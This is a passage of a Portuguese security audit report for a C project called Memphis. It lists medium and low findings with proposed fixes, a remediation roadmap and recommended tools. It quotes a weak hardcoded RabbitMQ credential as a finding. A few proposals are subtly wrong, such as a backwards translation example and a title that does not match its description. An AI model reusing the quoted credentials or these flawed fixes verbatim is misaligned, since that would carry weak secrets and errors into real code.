amqp_rpc_reply_t reply = amqp_login(consumer->conn, vhost, 0,
                                     AMQP_DEFAULT_FRAME_SIZE,
                                     AMQP_DEFAULT_HEARTBEAT,
                                     AMQP_SASL_METHOD_PLAIN,
                                     user, pass);
if (reply.reply_type != AMQP_RESPONSE_NORMAL) return NULL;

amqp_channel_open(consumer->conn, channel);
reply = amqp_get_rpc_reply(consumer->conn);
if (reply.reply_type != AMQP_RESPONSE_NORMAL) return NULL;
```

---

### ISSUE-031: Test File usa __FILE_pathed__ includes
**Severity**: 🟡 MEDIUM (code quality)  
**Files**: `test/test_*.c:5`

**Descrição**:
```c
#include "../include/config.h"
```

Paths relativos são frágeis. Se struct de diretório muda, quebra.

**Proposta**: Confiar em `include_directories()` do CMake (já configurado):
```c
#include "config.h"
```

---

### ISSUE-032: Setup Script setup-amqp.sh Vulnerável a Word Splitting
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-77  
**Files**: `scripts/setup-amqp.sh`

**Descrição**:  
`set -e` mas `rabbitmqctl add_user memphis memphis123` sem quotes em expansions (futuras).

**Proposta**: Adicionar `set -euo pipefail` e quote tudo:
```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'
```

---

### ISSUE-033: memphis.env.example Committed Contém "guest"
**Severity**: 🟡 MEDIUM  
**CWE**: CWE-798  
**Files**: `memphis.env.example`

**Descrição**:  
Developers podem copiar o `.example` e esquecer de trocar `guest`. 

**Proposta**:
```env
# REQUIRED: Change these before running!
RABBITMQ_USER=__REQUIRED__
RABBITMQ_PASS=__REQUIRED_MIN_16_CHARS__
```

E `config_is_valid()` rejeita `__REQUIRED__`:
```c
if (strstr(cfg->rabbitmq_user, "__REQUIRED__")) return false;
```

---

### ISSUE-034: Falta .env no .gitignore (verificado)
**Severity**: 🟡 MEDIUM (preventivo)  
**Files**: `.gitignore`

**Descrição**: `.gitignore` já tem `memphis.env` — OK. Mas falta `*.pem`, `*.key`, `*.crt`:

**Proposta**:
```gitignore
# Secrets and certificates
*.pem
*.key
*.crt
*.p12
*.pfx
secrets/
```

---

### ISSUE-035: Makefile `make install` Sem Verificação de Contexto
**Severity**: 🟡 MEDIUM  
**Files**: `Makefile:106`

**Descrição**:
```makefile
install: release
	@sudo install -D -m 755 $(BUILD_DIR)/bin/memphis /usr/local/bin/memphis
```

`sudo` silencioso, instala binário recém compilado sem verificação (checksum, GPG sig, etc).

**Proposta**: Exigir confirmação + integrity check:
```makefile
install: release
	@echo "Binary will be installed to /usr/local/bin/memphis"
	@sha256sum $(BUILD_DIR)/bin/memphis
	@read -p "Proceed? [y/N] " confirm && [ "$$confirm" = "y" ] || exit 1
	@sudo install -D -m 755 $(BUILD_DIR)/bin/memphis /usr/local/bin/memphis
```

---

### ISSUE-036: CHANGELOG.md Não Atualizado com Security Fixes
**Severity**: 🟡 MEDIUM (process)  
**Files**: `CHANGELOG.md`

**Descrição**:  
CHANGELOG precisa seção `### Security` para disclosure público.

**Proposta**: Template:
```markdown
## [0.2.0] - YYYY-MM-DD

### Security
- Fixed command injection in ls_send_command (CVE-TBD)
- Removed hardcoded default credentials
- Enabled TLS for RabbitMQ by default
```

---

## 🟢 BAIXOS

### ISSUE-037: Comentários em Português em Código
**Severity**: 🟢 LOW  
**Files**: `src/*.c`, `Makefile`

**Descrição**: Projeto open source → comentários devem ser em inglês.

**Proposta**: Traduzir:
```c
/* TODO: Load from environment and file */  /* → */
/* TODO: carregar de env vars e arquivo */
```

---

### ISSUE-038: README Sugere comando Inseguro `sudo apt install`
**Severity**: 🟢 LOW  
**Files**: `README.md`, `GETTING_STARTED.md`

**Descrição**:  
Docs não mencionam verificar fonte de packages.

**Proposta**: Documentar signature verification for prod deploys.

---

### ISSUE-039: Logo Level não Redigido de Ambiente
**Severity**: 🟢 LOW  
**Files**: `src/config.c:30 (TODO)`

**Descrição**: Placeholder comment `TODO: Load from environment and file`.

**Proposta**: Implementar ASAP antes de production.

---

### ISSUE-040: Sem `-Wconversion` / `-Wsign-conversion`
**Severity**: 🟢 LOW  
**Files**: `CMakeLists.txt:10`

**Descrição**: Warnings adicionais detectam bugs sutis.

**Proposta**:
```cmake
set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Wconversion -Wsign-conversion -Wshadow -Wvla")
```

---

### ISSUE-041: Sem Static Analysis Integrado (cppcheck, clang-tidy)
**Severity**: 🟢 LOW (já tem target mas não obrigatório)  
**Files**: `Makefile:77`

**Descrição**: `make static-analysis` existe mas não é rodado em CI.

**Proposta**: GitHub Actions workflow:
```yaml
- name: Static analysis
  run: make static-analysis
- name: Clang tidy
  run: clang-tidy src/*.c -- -I include
```

---

### ISSUE-042: Sem Fuzz Testing
**Severity**: 🟢 LOW  
**Files**: N/A

**Descrição**: Parser JSON + socket input são superfícies ideais para fuzzing (AFL++, libFuzzer).

**Proposta**:
```c
/* test/fuzz_message.c */
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
  char *str = malloc(size + 1);
  memcpy(str, data, size);
  str[size] = 0;
  message_t *msg = message_parse(str);
  if (msg) message_free(msg);
  free(str);
  return 0;
}
```

Build: `clang -fsanitize=fuzzer,address fuzz_message.c message.c -ljansson`

---

### ISSUE-043: Sem CI/CD
**Severity**: 🟢 LOW  
**Files**: `.github/workflows/` (não existe)

**Descrição**: Ver `GITHUB_READY.md` — há exemplo mas não está ativado.

**Proposta**: Criar `.github/workflows/ci.yml` como em `GITHUB_READY.md`, adicionar:
- Build
- Test
- Coverage upload (codecov)
- Static analysis
- Dependency audit (trivy, grype)

---

### ISSUE-044: Sem Documentação de Threat Model
**Severity**: 🟢 LOW  
**Files**: `docs/`

**Descrição**: Nenhum `THREAT_MODEL.md` documenta atacantes e superfícies.

**Proposta**: Criar documento STRIDE/PASTA com threats e mitigações.

---

### ISSUE-045: Sem SBOM
**Severity**: 🟢 LOW  
**Files**: N/A

**Descrição**: Sem Software Bill of Materials (deps, versões, CVEs).

**Proposta**: Usar `syft` ou `cyclonedx-cli`:
```bash
syft . -o cyclonedx-json > sbom.json
```

---

### ISSUE-046: Reconnect Storm Protection
**Severity**: 🟢 LOW (mas importante em produção)  
**Files**: `src/liquidsoap_client.c`, `src/rabbitmq_consumer.c`

**Descrição**:  
`ls_reconnect` é síncrono sem backoff inicial. Se LS fica oscilando, Memphis faz thousands of reconnects → thundering herd.

**Proposta**: Exponential backoff + jitter (já mencionado em ARCHITECTURE.md, mas garantir em código):
```c
static uint32_t backoff_ms(int attempt) {
  uint32_t base = 50 * (1 << MIN(attempt, 10));  /* 50ms, 100, 200, ... 50s */
  uint32_t jitter = (uint32_t)rand() % base;
  return MIN(base + jitter, 30000);  /* cap em 30s */
}
```

---

## Remediation Roadmap

### Sprint 1 — Críticos (1 semana) — BLOQUEIA PRODUÇÃO
- [ ] ISSUE-001: Command injection (validação + allowlist) 
- [ ] ISSUE-002: Remover credenciais default
- [ ] ISSUE-003: Habilitar TLS RabbitMQ
- [ ] ISSUE-004: Fix memory corruption em main.c
- [ ] ISSUE-005: O_NOFOLLOW em log file
- [ ] ISSUE-006: JSON escape em logs
- [ ] ISSUE-007: Socket timeouts
- [ ] ISSUE-008: Path traversal em announcement.push

### Sprint 2 — Altos (1-2 semanas)
- [ ] ISSUE-009 a 020: Memory safety, hardening, privilege dropping

### Sprint 3 — Médios (2-3 semanas)
- [ ] ISSUE-021 a 036: Signing, replay, validation, process hardening

### Backlog — Baixos
- [ ] ISSUE-037 a 046: Doc, CI, fuzz, SBOM

---

## Tools Recomendadas

| Purpose | Tool |
|---|---|
| Static analysis | cppcheck, clang-tidy, CodeQL |
| Dynamic analysis | valgrind, AddressSanitizer, UndefinedBehaviorSanitizer |
| Fuzzing | AFL++, libFuzzer, Honggfuzz |
| Dependency audit | trivy, grype, syft |
| SAST | SonarQube, Semgrep |
| Binary check | checksec, pwntools |

---

## References

- OWASP Top 10 (2021): A03 Injection, A02 Cryptographic Failures, A07 Authentication
- CWE Top 25 (2024): CWE-787, CWE-79, CWE-89, CWE-416
- CERT C Coding Standard: MEM30-C (Do not access freed memory), ERR33-C (Detect errors)
- NIST SP 800-53: AC-6 (Least Privilege), AU-9 (Protection of Audit Info)

---

## Revisão & Sign-off

**Próxima revisão**: Após correção dos críticos (Sprint 1)  
**Responsável**: Security Consultant  
**Status**: 🔴 **NOT READY FOR PRODUCTION** até Sprint 1 completo

---

*Documento gerado em 2026-04-20*  
*Memphis v0.1.0 (Phase 1-2 skeleton)*
